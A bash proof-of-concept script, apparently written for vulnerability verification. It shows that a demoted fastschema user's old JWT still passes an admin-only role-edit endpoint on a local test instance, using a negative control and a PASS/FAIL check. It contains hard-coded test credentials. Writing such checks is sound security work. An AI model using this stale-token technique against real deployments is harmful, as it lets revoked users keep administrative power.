#!/usr/bin/env bash
set -u
B=http://localhost:8008

login() { curl -s -X POST "$B/api/auth/local/login" -H 'Content-Type: application/json' -d "{\"login\":\"$1\",\"password\":\"$2\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('token',''))" 2>/dev/null; }
roleids() { curl -s -G "$B/api/role" -H "Authorization: Bearer $1" | python3 -c "import sys,json;d=json.load(sys.stdin);print(json.dumps({r['name']:r['id'] for r in d['data']}))"; }
claimroles() { echo "$1" | cut -d. -f2 | python3 -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);u=json.loads(base64.urlsafe_b64decode(s))['user'];print('role_ids='+json.dumps(u.get('role_ids')))"; }
cj() { curl -s -o /tmp/fc -w '%{http_code}' -X "$1" "$B$2" -H "Authorization: Bearer $3" -H 'Content-Type: application/json' -d "$4"; }
cget() { curl -s -o /tmp/fc -w '%{http_code}' -X "$1" "$B$2" -H "Authorization: Bearer $3"; }
body() { head -c 90 /tmp/fc | tr '\n' ' '; }

echo "== admin login =="
TA=$(login admin AdminPass123); echo "  TA len=${#TA}"
R=$(roleids "$TA"); echo "  roles=$R"
ADMINID=$(echo "$R" | python3 -c "import sys,json;print(json.load(sys.stdin)['Admin'])")
USERID=$(echo "$R" | python3 -c "import sys,json;print(json.load(sys.stdin)['User'])")
GUESTID=$(echo "$R" | python3 -c "import sys,json;print(json.load(sys.stdin)['Guest'])")

echo "== create victim (role Admin) + plain (role User) =="
VBODY="{\"username\":\"victim\",\"password\":\"VictimPass123\",\"email\":\"victim@local.test\",\"provider\":\"local\",\"active\":true,\"roles\":[{\"id\":\"$ADMINID\"}]}"
echo "  victim create: $(cj POST /api/content/user "$TA" "$VBODY") $(body)"
VICTIMID=$(python3 -c "import json;print(json.load(open('/tmp/fc')).get('data',{}).get('id',''))" 2>/dev/null)
echo "  victimId=$VICTIMID"
PBODY="{\"username\":\"plain\",\"password\":\"PlainPass123\",\"email\":\"plain@local.test\",\"provider\":\"local\",\"active\":true,\"roles\":[{\"id\":\"$USERID\"}]}"
echo "  plain create: $(cj POST /api/content/user "$TA" "$PBODY") $(body)"

echo "== SOURCE target = PUT /api/role/{GuestId} (admin-only, idempotent) =="
echo "== NEG CONTROL: plain (role User) -> PUT role -> expect 403 =="
TP=$(login plain PlainPass123); claimroles "$TP"
C_NEG=$(cj PUT /api/role/$GUESTID "$TP" '{"name":"Guest","description":"byplain"}'); echo "  plain PUT role=$C_NEG $(body)"

echo "== A/B victim_old (role Admin) PUT role (before demotion) -> expect 2xx =="
TV=$(login victim VictimPass123); claimroles "$TV"
C_BEFORE=$(cj PUT /api/role/$GUESTID "$TV" '{"name":"Guest","description":"src-before"}'); echo "  before=$C_BEFORE $(body)"

echo "== D TRANSITION admin sets victim roles=[User] -> expect 2xx =="
C_TRANS=$(cj PUT /api/content/user/$VICTIMID "$TA" "{\"roles\":[{\"id\":\"$USERID\"}]}"); echo "  transition=$C_TRANS $(body)"

echo "== E BUG victim_old SAME token PUT role (after demotion) -> expect 2xx =="
C_AFTER=$(cj PUT /api/role/$GUESTID "$TV" '{"name":"Guest","description":"src-after"}'); echo "  after=$C_AFTER $(body)"

echo "== F D1 victim re-login new token -> PUT role -> expect 403 =="
TVN=$(login victim VictimPass123); claimroles "$TVN"
C_NEW=$(cj PUT /api/role/$GUESTID "$TVN" '{"name":"Guest","description":"newtok"}'); echo "  newtok=$C_NEW $(body)"

echo "== VERDICT =="
ok=1
case "$C_BEFORE" in 2*) ;; *) echo "  X source before not 2xx ($C_BEFORE)"; ok=0;; esac
case "$C_TRANS" in 2*) ;; *) echo "  X transition not 2xx ($C_TRANS)"; ok=0;; esac
case "$C_AFTER" in 2*) ;; *) echo "  X old-token after not 2xx ($C_AFTER)"; ok=0;; esac
[ "$C_NEW" = 403 ] || { echo "  X new-token != 403 ($C_NEW)"; ok=0; }
[ "$C_NEG" = 403 ] || { echo "  X neg-control != 403 ($C_NEG)"; ok=0; }
if [ "$ok" = 1 ]; then
  echo "  PASS: MR-A1 confirmed on running fastschema $(git -C infra/fastschema-target/fastschema rev-parse --short HEAD 2>/dev/null)"
  echo "  old-token after demotion=$C_AFTER (ALLOWED) vs new-token=$C_NEW (DENIED) ; neg=$C_NEG"
  exit 0
else echo "  FAIL"; exit 1; fi
